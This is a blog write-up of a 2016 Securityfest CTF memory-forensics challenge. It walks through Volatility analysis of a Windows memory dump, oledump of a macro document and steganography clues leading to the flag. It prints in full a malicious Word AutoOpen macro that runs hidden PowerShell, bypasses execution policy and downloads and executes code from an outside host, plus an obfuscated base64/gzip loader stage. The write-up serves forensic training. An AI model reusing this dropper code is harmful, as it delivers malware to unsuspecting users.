---
date: 2016-06-06
title: 'Securityfest CTF - Coresec challenge writeup'
template: post
slug: securityfest-ctf-coresec-challenge-writeup
categories:
 - CTF
tags:
 - CTF
---

This challenge was produced by [Coresec Systems](http://coresecsystems.com/) and was released during [Securityfest](https://securityfest.com/). I would liked to have spent more time on it during the event but couldn't really find any time for it. Now the event is over and first year of university is completed, I decided to try to finish the challenge. It was quite tricky at some points but now when I think about it in hindsight, the challenge itself was actually fairly simple. Okey, nuff said let's boogie!

## First contact
First thing was to download a 330 MB file called `coresec-challenge.tar.gz`. After downloading the file and unpacking its contents I was presented with a Coresec-CTF-SecurityFest2016.vmem file which is a memory dump of a system. In order to analyze the file I used the [volatility framework](https://github.com/volatilityfoundation/volatility) which works great for memory forensics. I relied heavily on this [cheat sheet](http://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf) to figure out how to solve some of the steps in the challenge.

First thing to do is to identify which system this memory dump belongs to:
```bash
$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem imageinfo
Volatility Foundation Volatility Framework 2.4
Determining profile based on KDBG search...

          Suggested Profile(s) : Win7SP0x64, Win7SP1x64, Win2008R2SP0x64, Win2008R2SP1x64 (Instantiated with Win7SP0x64)
                     AS Layer1 : AMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/Users/michaeldubell/Downloads/volatility_2.4.mac.standalone/Coresec-CTF-SecurityFest2016.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a450a0
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a46d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2016-06-02 07:50:46 UTC+0000
     Image local date and time : 2016-06-02 09:50:46 +0200
```

As we can see volatility suggest that we use the Win7SP0x64 profile which indicates that the system is probably a Windows 7 x64 system. Now that I have identified the correct profile, I could begin looking for clues.

First thing I did was to dump all the running processes to see if there was any interesting software running.

```bash
$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile=Win7SP0x64 psscan
Volatility Foundation Volatility Framework 2.4
Offset(P)          Name                PID   PPID PDB                Time created                   Time exited
------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
0x0000000004dfab30 iexplore.exe        800   1820 0x000000003cb43000 2016-06-02 07:49:58 UTC+0000
0x0000000021075360 svchost.exe         724    476 0x000000003785c000 2016-06-02 07:46:19 UTC+0000
0x000000003dacb060 sppsvc.exe          584    476 0x000000001117f000 2016-06-02 07:48:21 UTC+0000
0x000000003daf8920 AdobeARM.exe       2980   2628 0x000000001ec80000 2016-06-02 07:47:19 UTC+0000
0x000000003dbaf7c0 svch0st.exe        1628   1820 0x00000000381c8000 2016-06-02 07:49:57 UTC+0000
0x000000003dc13730 taskhost.exe       1752    476 0x00000000307a5000 2016-06-02 07:46:25 UTC+0000
0x000000003dc15320 dwm.exe            1808    812 0x0000000030375000 2016-06-02 07:46:25 UTC+0000
0x000000003dc33900 svchost.exe        1276    476 0x000000002e6e0000 2016-06-02 07:46:21 UTC+0000
0x000000003dcddb30 explorer.exe       1820   1788 0x00000000302f9000 2016-06-02 07:46:25 UTC+0000
0x000000003de19b30 audiodg.exe         956    724 0x00000000397ee000 2016-06-02 07:46:19 UTC+0000
0x000000003de72640 svchost.exe         300    476 0x0000000038c7d000 2016-06-02 07:46:20 UTC+0000
0x000000003de9c360 svchost.exe         900    476 0x0000000032985000 2016-06-02 07:46:20 UTC+0000
0x000000003df3b6c0 spoolsv.exe        1096    476 0x000000002f1d3000 2016-06-02 07:46:20 UTC+0000
0x000000003df75740 svchost.exe        1132    476 0x0000000033d6a000 2016-06-02 07:46:20 UTC+0000
0x000000003dfb9b30 armsvc.exe         1240    476 0x0000000033772000 2016-06-02 07:46:20 UTC+0000
0x000000003e020740 services.exe        476    384 0x0000000039e06000 2016-06-02 07:46:19 UTC+0000
0x000000003e022690 lsm.exe             492    384 0x00000000063ae000 2016-06-02 07:46:19 UTC+0000
0x000000003e02a700 lsass.exe           484    384 0x00000000060a7000 2016-06-02 07:46:19 UTC+0000
0x000000003e10a290 svchost.exe         604    476 0x00000000389cb000 2016-06-02 07:46:19 UTC+0000
0x000000003e125060 svchost.exe         672    476 0x0000000037d0f000 2016-06-02 07:46:19 UTC+0000
0x000000003e18f430 svchost.exe         812    476 0x000000003c4a3000 2016-06-02 07:46:19 UTC+0000
0x000000003e1ac730 SearchIndexer.     1988    476 0x000000002a0bb000 2016-06-02 07:46:31 UTC+0000
0x000000003e1f5380 svchost.exe         892    476 0x0000000039db3000 2016-06-02 07:46:19 UTC+0000
0x000000003e200910 csrss.exe           392    376 0x000000003ba53000 2016-06-02 07:46:18 UTC+0000
0x000000003e216060 mscorsvw.exe       3056    476 0x00000000102f7000 2016-06-02 07:48:21 UTC+0000
0x000000003e24eb30 AcroRd32.exe       2628   1820 0x000000000196a000 2016-06-02 07:46:47 UTC+0000
0x000000003e29f2a0 RdrCEF.exe         2880   2716 0x000000001243f000 2016-06-02 07:46:48 UTC+0000
0x000000003e2c3920 notepad.exe        2548   1820 0x000000001caf5000 2016-06-02 07:46:45 UTC+0000
0x000000003e2c5b30 SearchProtocol     2556   1988 0x0000000026568000 2016-06-02 07:46:45 UTC+0000
0x000000003e2d9420 mscorsvw.exe       1052    476 0x000000003bf9e000 2016-06-02 07:48:21 UTC+0000
0x000000003e2db060 WINWORD.EXE        1116   1820 0x000000003bfdb000 2016-06-02 07:48:14 UTC+0000
0x000000003e328b30 OSPPSVC.EXE        2328    476 0x0000000006407000 2016-06-02 07:46:57 UTC+0000
0x000000003e3bb060 winlogon.exe        432    376 0x000000003acd9000 2016-06-02 07:46:18 UTC+0000
0x000000003e598450 csrss.exe           336    320 0x00000000114cc000 2016-06-02 07:46:17 UTC+0000
0x000000003e5ce060 svchost.exe         880    476 0x000000000b38d000 2016-06-02 07:48:21 UTC+0000
0x000000003e5d3b30 cmd.exe            2756   1820 0x00000000248d7000 2016-06-02 07:49:55 UTC+0000
0x000000003e5ef740 AcroRd32.exe       2672   2628 0x000000001819e000 2016-06-02 07:46:47 UTC+0000
0x000000003e5f3b30 RdrCEF.exe         2716   2628 0x000000001a1b7000 2016-06-02 07:46:48 UTC+0000
0x000000003ea58060 firefox.exe         992   1820 0x00000000226d1000 2016-06-02 07:46:32 UTC+0000
0x000000003ed96310 smss.exe            260      4 0x000000001c821000 2016-06-02 07:46:17 UTC+0000
0x000000003edb1290 iexplore.exe       1200    800 0x00000000084cc000 2016-06-02 07:49:59 UTC+0000
0x000000003fc23b30 SearchProtocol     2204   1988 0x0000000002e42000 2016-06-02 07:50:21 UTC+0000
0x000000003fc45b30 WMIADAP.exe         284    892 0x000000002c440000 2016-06-02 07:50:21 UTC+0000   2016-06-02 07:50:44 UTC+0000
0x000000003fc69b30 cmd.exe            3596   1544 0x000000002efec000 2016-06-02 07:50:44 UTC+0000
0x000000003fc74060 PING.EXE           3604   3596 0x0000000011f92000 2016-06-02 07:50:44 UTC+0000
0x000000003fc86060 WmiPrvSE.exe       3044    604 0x00000000030f6000 2016-06-02 07:50:21 UTC+0000
0x000000003fc9f060 conhost.exe        2708    392 0x0000000021fa6000 2016-06-02 07:49:57 UTC+0000
0x000000003fca0530 conhost.exe        2028    392 0x000000002535c000 2016-06-02 07:49:55 UTC+0000
0x000000003fca0b30 SearchFilterHo      144   1988 0x000000001695b000 2016-06-02 07:49:32 UTC+0000
0x000000003fd24630 taskhost.exe        168    476 0x000000002b7f8000 2016-06-02 07:49:20 UTC+0000
0x000000003fd34850 svch0st.exe        1544   1628 0x0000000019118000 2016-06-02 07:49:57 UTC+0000
0x000000003fe07b30 splwow64.exe       2232   1116 0x000000003f645000 2016-06-02 07:48:29 UTC+0000
0x000000003fea3060 wininit.exe         384    320 0x000000003be52000 2016-06-02 07:46:18 UTC+0000
0x000000003fedf450 System                4      0 0x0000000000187000 2016-06-02 07:46:17 UTC+0000
```

As you can see in the process list, we have WINWORD.exe, firefox.exe, cmd.exe, notepad.exe and PING.exe running. Perhaps what we are looking for can be found within these programs.

My next step was to dump a list of all the files contained in the image. The full list is too large so I'll only show small portion.

```bash
$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile=Win7SP0x64 filescan
Volatility Foundation Volatility Framework 2.4
Offset(P)            #Ptr   #Hnd Access Name
------------------ ------ ------ ------ ----
0x0000000004dfef20     12      0 R--r-- \Device\HarddiskVolume2\PROGRA~2\MICROS~1\Office14\URLREDIR.DLL
0x000000001a7063a0     16      0 RW-rw- \Device\HarddiskVolume2\Users\coresec\AppData\Local\Mozilla\Firefox\Profiles\c6digex6.default\cache2\entries\FE00C2B6C2F56600231E20DF3A49C88C24168A40
0x000000001a7065f0      2      1 R--rwd \Device\HarddiskVolume2\Users\coresec\AppData\Roaming\Microsoft\Windows\Network Shortcuts
0x000000001a7069e0      2      0 R--rwd \Device\HarddiskVolume2\Users\coresec\AppData\Roaming\Microsoft\Windows\Recent\desktop.ini
0x000000001a706dd0     11      0 R--r-d \Device\HarddiskVolume2\Windows\System32\ntlanman.dll
0x000000001a820560      5      0 RW-rwd \Device\HarddiskVolume2\$Directory
0x000000001a8208d0      4      0 R--r-- \Device\HarddiskVolume2\Windows\Fonts\msjhbd.ttf
0x000000001a820af0     17      1 R--r-d \Device\HarddiskVolume2\Windows\System32\en-US\win32k.sys.mui
0x000000001a897750      7      0 R--r-d \Device\HarddiskVolume2\Windows\System32\mprapi.dll
0x000000001aac4730     15      0 R--r-d \Device\HarddiskVolume2\Windows\System32\esent.dll
0x000000001db213e0      7      0 R--r-- \Device\HarddiskVolume2\Windows\Fonts\simsunb.ttf
0x000000001db217a0     16      0 -W-rwd \Device\HarddiskVolume2\Users\coresec\AppData\Local\Microsoft\Windows\Temporary Internet Files\Low\Content.IE5\NOXO93NB\csf_front[1].jpg
0x000000001db21ce0      7      0 R--r-- \Device\HarddiskVolume2\Windows\Fonts\msyh.ttf
[...]
```

I noticed that there is user called coresec in the file list so I thought I would extract all the files within the user's home folder to see if any thing interesting would show up.

```bash
$ grep '\\Device\\HarddiskVolume2\\Users\\coresec\\' filelist.txt > coresec.txt
```

When looking through the coresec.txt I noticed this line
`0x000000003e0d7590      5      0 RW-r-- \Device\HarddiskVolume2\Users\coresec\Desktop\SecretStuff.docm`. I ran the following command to see if there was anything else in the user's desktop.

```bash
$ grep Desktop coresec.txt
0x000000003da9aaf0      2      1 R--rwd \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003daaeb20     16      0 R--rwd \Device\HarddiskVolume2\Users\coresec\Desktop\desktop.ini
0x000000003df60340     16      0 R--rwd \Device\HarddiskVolume2\Users\coresec\Links\Desktop.lnk
0x000000003df64140      1      1 R--rw- \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003e0d7590      5      0 RW-r-- \Device\HarddiskVolume2\Users\coresec\Desktop\SecretStuff.docm
0x000000003e0da070      2      0 R--rwd \Device\HarddiskVolume2\Users\coresec\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
0x000000003e2954b0      1      1 R--rw- \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003ecb8cd0      2      1 R--rwd \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003f013890      2      1 RW-r-- \Device\HarddiskVolume2\Users\coresec\Desktop\SecretStuff.docm
0x000000003f035f20      1      1 R--rw- \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003f2c07a0     16      0 -W---- \Device\HarddiskVolume2\Users\coresec\Desktop\~$cretStuff.docm
0x000000003fc29730     16      0 R--rwd \Device\HarddiskVolume2\Users\coresec\Desktop\noflaghere.bat
0x000000003fca9650      1      1 R--rw- \Device\HarddiskVolume2\Users\coresec\Desktop
0x000000003fe79070      1      1 R--rw- \Device\HarddiskVolume2\Users\coresec\Desktop
```

The `SecretStuff.docm` file looks interesting so I looked up the **.docm** extension on google and found out that it is a *macro enabled document*, which means it's highly likely it contains the next piece of information to solve the challenge.

To make sure that **WINWORD.exe** was used to open the file I ran the following command:

```bash
$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile=Win7SP0x64 cmdline
[...]
WINWORD.EXE pid:   1116
Command line : "C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n "C:\Users\coresec\Desktop\SecretStuff.docm"
************************************************************************
[...]
```

Nice, now I'm sure **WINWORD.exe** was used to open the file. Next step is to try to get the contents of `SecretStuff.docm`, this can be done by running the following command:

```bash
./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile=Win7SP0x64 dumpfiles -Q 0x000000003f013890 --name -D secrectdocfolder/
```

0x000000003f013890 is the offset found the file list earlier. Now I have the file in my **secrectdocfolder**. Running the `file` command gives us what type of file it is:
```bash
$ file file.None.0xfffffa800eaacb30.SecretStuff.docm.dat
file.None.0xfffffa800eaacb30.SecretStuff.docm.dat: Zip archive data, at least v2.0 to extract
```

Alright, so it looks like a .zip file, when I first unpacked the file my anti-virus software started to ring. Apparently there is a file within the "zip" file that is malicious. I temporarily disabled my anti-virus software inspected the file, which was: **word/vbaProject.bin**


## World of Macro
When I was researching **.docm** files I came across a tool called [oledump](https://blog.didierstevens.com/programs/oledump-py/), with this tool I could inspect **vbaProject.bin** and display the marco code hidden within the file.

```bash
$ ./oledump.py vbaProject.bin
  1:       424 'PROJECT'
  2:        71 'PROJECTwm'
  3: M    2603 'VBA/NewMacros'
  4: m     994 'VBA/ThisDocument'
  5:      8447 'VBA/_VBA_PROJECT'
  6:      2409 'VBA/__SRP_0'
  7:       122 'VBA/__SRP_1'
  8:      1057 'VBA/__SRP_2'
  9:       156 'VBA/__SRP_3'
 10:       570 'VBA/dir'
```

This looks interesting. After running `./oledump.py --help` to understand how to use it, I ran the following command:
```bash
$ ./oledump.py -v -s 3 vbaProject.bin
Attribute VB_Name = "NewMacros"
Sub AutoOpen()
Dim exec As String
exec = "" + "p" & "owerS" + "h" + "ell.e" + "x" + "e -NoP -NonI -W Hidden -Exec Bypass -Comm"
exec = exec + "and ""$C0r3s3c=new-object net.webclient;"
exec = exec + "$C0r3s3c.proxy=[Net.WebRequest]::GetSystemWebPr"
exec = exec + "oxy(); $C0r3s3c.Proxy.Credentials=[Net.Credenti"
exec = exec + "alCache]::DefaultCredentials;IEX $C0r3s3c.downl"
exec = exec + "oadstring('http://www." + "c" & "o" + "res" & ""
exec = exec + "e" + "c" & "sy" + "ste" & "ms" + ".com/cs5/co"
exec = exec + "resec-logo.png');"
Shell (exec)
End Sub
```

Aha, the script is downloading an image from this location `http://coresecsystems.com/cs5/coresec-logo.png`, I wonder what it is? After downloading the image with `wget` and inspecting the file I get:
```bash
$ cat coresec-logo.png
$JavaScript = [SySTeM.cOnVeRt]::frOmBaSE64sTrInG("H4sICCDLPFcAA2NvcmVzZWMtY3RmLmh0bWwAzVnbbttGEN3nAv0HpkHRBLDlOJemld0GTlKjKZA4SAIEfQooiZIYUaRASnbUor/edubMLHeXpGwJjtuAkE3tZa5nLrv65+9jMzVLMzeZ+dl8bb4yx/QtpU9mEho5pXd+q0xkfjG5GZrSrM2C5hMzMrdo9UGwXihU9H3tjcS0+0/6DE1BowXR6JsJ/U3oyc0RzfyFdT3aN9C1Eb3FtGOGlYVZ0coR7bsgeVPwP8Iapjaib6XZ9/j26Z15pTTXXneB8SVR6ptD0uYT1iyI34ielDhNaOZBPRPu9rVgDnOVxenA1hAtxrQup+8sW2r+gGSHHmWf1g/03NPH0WMLN+15DIlGNBZ5cz+ZbxqaMaVvVYMuW94mSR6YZ/Sc0nNE+4U+W/+Y1ieQnbX2x9lC5y3OvO4TNI1hlQnt7WN2TKNHgS3GtGYOZK1pzQnRT7HraAuLZfBPQvNT+st8GL99c590tWvmRK2kGV65T7MFzYg97ArfTmJ15+tuS52ah/WnCy33AxrXReWjLbB32zwl29lP6D3x1IBGjmuLMtoykrqiRzzGOOVd74lnjBX8f0FPAhuPaIStF5H8bIsS/rEZ4QmwKTwOai5tGcrWmJMoxNDlvmdJT5A1IqCFY6ygPd3SsYfYg4zLoeYrtuYau4VzCX4T+pYEuS3FuKCE/RGZN+Yt8d6Hlx8SYp50anZG/IcqSwU5c0iwBzty3mK55O9HWlWpzQtYfEwjGWIiwnsOj01V1wSSJrVe50CLr9Uz4CIB56FGEtvkLb6vEGVLrDzFKubN+hya7ylrWX2iQKMT4N/RWiLqIvAZKjLb1okofhJwEl3FCmxlRt+6RhVbaklarSBPRVJchZ2XqmOEuBOp5sCu9VmMiFmBn5W227siI8u3At4ECW1dhkQzh5UTtcRKrTJFVDJKWdoYIyU8yWieIsI48xzQwzL0gKgZfRbwHGe9HnSY0Ao7d6AyfDB3PKkLWK4CkufmLtFn/STPJfTGHD+QjBmknSFablYCjvoY0S9+2jUL7J6dRrRWYttF0xyoyv+XbOTT4ecFspGTbYoaIchJgKES0mbICC/AcaV4tlnAZrMI3hl50VNqTrCofk3jF0DgW4xIRqzgsRQecxnMRgTnx1Jjn+tIAX8L8odAk5+HesgAGVGJ60hZkEwxMODn3dckg41qK1+m64TbOSStvDjNtb4whRzZIFepJlq7J966AWa4MnMn+klzmovm11pZh8gvA2A21qxiPbMAhlmGAbwcUmXrVtq5SF71bSl0um0u3hYN18pHVllbMifxgKxlDFSaA3NIUtTYkSyTEIVQAmsRiXDOmrFWBFenJvDpqMOOFXy3QKwv65ph+Z2RPj0jPT77VLoqxhx3agPtuiYd+dVGYQH9RZ9mHr8qHq+XH36FtV28hPFnu5kvIT+8rxGzKcbHQOMK0hdBtC+BmVmd/eJ6fenlkV6nDlLJw86pu2cKK6VEgUOXlWVBOwcabbaO7qkWC0jR5L5JqueIY1eZBWPzuq+PECVzVDg5aVXGVuJ2NEsVH+Ldr1uRh4cy6GfmoLEEtQTSZy35bxq/YX2TusBvXxZiU6/TlloxV1zaaBvDutKZOax0dbCWSqWVKQtiIIO3JfOvlb7NYXKWsxQ4Y51idmT83JkhM966YrYdIeKfvZa24hcrH0firNZduvwEqGPfxloD5trtrrQnb/fQFTA3BK+0Pm2lnl2ThiUL6JLWVc+nWhASWDLW19qrqbPEsvjTVcftY5V5fhf4yOaOSE//idZQX7rCyzefJ7LsDUQzogboikPMhyfm5h3LVbcNm0/ol0XNqfokblRJ590FKEp9kr4qB05szzQym044e9idKbqY1jmopw1eU82b4ukJNGt7etrpacldh6gml59qhsGZ0z8fMLKGkGH3k8o2VN3pQ3LkNijmtYKdbbLoLijbDUeXYXLzucLVeuvZUlFgo83Gu9xMlZqRmqfwmLSKEbexVs49pZ5BqouaUqV5im3POO1fgplDZOPn2J+Djpx9bP+eQsZl3X8soc0+LM97Kthmm5P0BZ6eUpDbkI9GbnncWTYcr3BPzXMhv159+91D7todqzcpTfOE3bT5fT2hjY3c0tqbrRVxsfVITiBN+4f5pHmyDKVyPrwAbvy+U6rNUu9vGfmO8uZe9AHkfof+zN7lbEbvAP4QZFzd2fC5y90KD4DqUeuu/Tai7Ud6HtMjUcc3uzPch9/zsk8PlFMayxv1apN2D7UvaceT80IJH/l1POz2K/2NY7MNN43/Vt8rzlCt7A311We07TPjpm73hXlJJ+Qz84Z8e2Je0V/OXa/IFjz2ksbe0fczGul7ve11c69flR+TR+9dUpl/r089r7RjcfnN9ezXr3kHmHlE/8Nb2Q96Li+QLxfwzM3Ux10kaNbSTdhy1pM75ULzgrPgHbKrVBn/TvUd/H/3P4jhz2MZzqsfSZ/JFhHfFTmbxtq/qInF5bc8N+J+kf0X618S+6AdAAA=")
$aes256 = nEw-oBJeCt SYsTem.IO.mEmOryStrEAm
$aes256.wRIte($JavaScript, 0, $JavaScript.Length)
$aes256.SeEk(0,0) | oUT-nUlL
$coresec = nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm($aes256, [SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe]::dECoMpReSs)
$securityfest2016 = nEw-oBjeCt SySTem.IO.StrEAmREAder($coresec)
$begin_attack = $securityfest2016.rEaDtOeNd()
$localh0st = $env:TEMP
$begin_attack| oUT-fILe ($localh0st + '\cOrEsEc-cTf.HtMl')
IeX ($localh0st + '\cOrEsEc-cTf.HtMl')

```

First thing I noticed was the base64 data. Decoding the data reveals garbage data, so there has to be something else going on. Reading the code more carefully reveals that it is decompressing data further down:
```
$coresec = nEw-oBJeCt sySTeM.IO.cOMprEssIon.GZipsTReAm($aes256, [SySTem.IO.cOMpReSSiOn.CoMpResSiOnmODe]::dECoMpReSs)
```

The base64 encoded data contains the compressed data, that's why it showed me garbage when I decoded it. I saved the base64 encoded to its own file and ran the following to decompress the data: `cat base.txt | base64 --decode > lol.zip`

Running the `file` command did indeed report that it was a compressed file.
```bash
$ file lol.zip
lol.zip: gzip compressed data, was "coresec-ctf.html", from Unix, last modified: Wed May 18 22:05:52 2016
```

After unpacking the file with `gunzip` I got a HTML file.

```
<html>
<title>Files Encrypted!</title>
<style>
a { color:green; }
.tb {  background:white; border-style:solid; border-width:1px; padding:3px; border-color:lime; }
.ttl { font-size:13px; color:880000; }
</style>
<body style="width:100%; background:#33CCFF;">
  <center>
  <div style="text-align:left; font-family:Arial; font-size:13px; line-height:20px; margin-top:10px; width:800px; background:#F4F4F4; padding:20px; border-style:solid; border-width:5px; border-color:#BABABA;">
    <b><font class="ttl">What happened to your files?</b></font>
    <br>
    <font style="font-size:13px;">Are all of your files protected by a strong encryption with RSA-2048?<br>
    Ofcourse not, this is just hopefully fun challenge provided by Coresec for Security Fest 2016.<br>
    And for the record RSA-2048 key is not easy to outguess.
    <br>
    More information about the encryption keys using RSA-2048 can be found here: <a href="http://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">http://en.wikipedia.org/wiki/RSA_(cryptosystem)</a><br></font>
    <br>
    <b><font class="ttl">What does this mean?</b></font>
    <br>
    <font style="font-size:13px;">
      If this had been real, I sure hope you did not run the PowerShell script without first looking carefully. Always update your PS to the latest version and turn on logging and block Execution Policy bypass. If possible block unsigned scripts. PowerShell is very powerfull but is also one of the few scripting language with good logging support by the OS. Enought rambling about this move on.
    </font>
    <br><br>
    <b><font class="ttl">How did this happen?</b></font>
    <br>
    <font style="font-size:13px;">
      Well you did not focus on the talks that for sure.<br>
      Are all your files encrypted with the public key, nope.
      <br>
      Decrypting might sometimes be possible since crypto is hard for most people.
    </font>
    <br><br>
    <b><font class="ttl">What do I do?</b></font>
    <br>
    <font style="font-size:13px;">
      Well if you came this far in the challenge you should not let anything stop you. Find the flag! Find the flag!
      Alas, if you do not take the necessary measures for the specified time then the conditions for obtaining the flag will pass.
      <br>
      Don't let file extensions fool you.
    </font>
    <br><br>
    <div class="tb" style="color:#880000; font-size:13px; border-width:3px;">
      For at this time perhaps unrelated information, please visit this home page:
      <hr>
      <b>1.<a href="http://coresecsystems.com" target="_blank">http://coresecsystems.com</a></b>
      <br>
    </div>
    <br>
    <div class="tb" style="font-size:13px; border-color:#880000;">
      If for some reasons the address is not available, follow these steps: <hr>
      1. Download and install tor-browser: <a href="http://www.torproject.org/projects/torbrowser.html.en" target="_blank">http://www.torproject.org/projects/torbrowser.html.en</a><br>
      2. After a successful installation, run the browser and wait for initialization.<br>
      3. Type in the address bar: <font style="font-weight:bold; color:#009977;">F4k3C0resec.oni0n</font><br>
      4. Follow the instructions on the site.<br>
      <br>
      Just kidding move on.
    </div>
    <br>
    <br>
    <b>IMPORTANT INFORMATION:</b><br>
    <div class="tb" style="width:790px;">
      Your Next step <b><a href="http://coresecsystems.com/cs5/Coresec_logo1.png" target="_blank">http://coresecsystems.com/cs5/Coresec_logo1.png</a></b><br>
      Your Second step (Not using TOR): <font style="font-weight:bold; color:#009977;">coresecsystems.com/cs5/Coresec_logo2.jpg</font><br>
    </div>
  </div>
  </center>
</body>
</html>
```

Alright, so far so good. Next step was to download this image `http://coresecsystems.com/cs5/Coresec_logo1.png`, according to the HTML document.

## Steganography
Running the `file` command informed me that it was a JPEG file even though the file extension was .png.
```bash
$ file Coresec_logo1.png
Coresec_logo1.png: JPEG image data, JFIF standard 1.01
```

So I ran `less Coresec_logo1.png` and scrolled down its contents, and there it was at the end, a reversed base64 encoded string.

```
==gLzNXZ1dGd19GIvRHI5NXYlBCdhhGdgMXag82ZlR3UgwGbhBCdv5GI0VnYu4iLk5WamBCZv92ZgwSYoFGS
```

After reversing the string using some random online tool and decoding it I got the following.
```
Haha, good find...but not all Stego is that easy to outguess.
```

I was a little bit puzzled during this step, I was not sure which path to take in order to find the flag. I thought this image must have an embedded message inserted with a public steganography tool. I searched google to find all possible tools, then I came across a tool called *OutGuess*. Coincidence? I think not. I installed the tool on my kali linux machine and ran the following command:
```bash
root@kali:~/Desktop# outguess -r Coresec_logo1.jpg out.jpg
Reading Coresec_logo1.jpg....
Extracting usable bits:   9100 bits
Steg retrieve: seed: 59, len: 82
root@kali:~/Desktop# cat out.jpg 
There is no place like: 127.0.0.1
Rember this key thing in life, and use that. :)
```

Wow, there we go. Next step was to investigate the next image found in the HTML file in the previous steps, `http://coresecsystems.com/cs5/Coresec_logo2.jpg`.

As usual, I run the `file` command to identify the newly downloaded file.
```bash
$ file Coresec_logo2.jpg
Coresec_logo2.jpg: 7-zip archive data, version 0.3
```

A 7-zip file, interesting. I change the file extention to .7z and used my local archive program to unpack the file. However I was asked to enter a password.

![screenshot](../images/Screen-Shot-2016-06-08-at-00-38-34.png)

My first thought was to find some archive cracker, but then I remembered the message from the previous image *There is no place like: 127.0.0.1* and that I should remember this **key** thing in life. So I entered `127.0.0.1` as my password and voila, access granted!

The unpacked file contained a regular *hosts* file usually found on unix systems, however the file was called `hosts.bak` which got me thinking that this is a backup file of the original file which has been updated with new information. If my theory was correct I had to go back to the **.vmem** file and extract the hosts file like I did with the **.docm** file.

I consulted my filelist.txt which contained all the files present in the memory dump file and searched for *hosts*. Then I ran the following:
```bash
$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile=Win7SP0x64 dumpfiles -Q 0x000000003e1ab7b0 --name -D ./
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0x3e1ab7b0   None   \Device\HarddiskVolume2\Windows\System32\drivers\etc\hosts
$ cat file.None.0xfffffa800da434c0.hosts.dat
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

# 433072337333637b353466334c795f336e34384c316e365f385535316e3335357d
```

## Get the flag
Found a strange string at the end of the *hosts* file, I wondered what it could be. My first thought was that it was a hash, but it didn't really look like any hash I could recognize. I searched google to find some site that could perhaps identify the string but no joy. After some time just looking at the string I realized that there are only 0-9 and b-e which got me thinking that this is perhaps HEX characters.

Using an online HEX to ASCII converter, **I found the flag:** `C0r3s3c{54f3Ly_3n48L1n6_8U51n355}` 

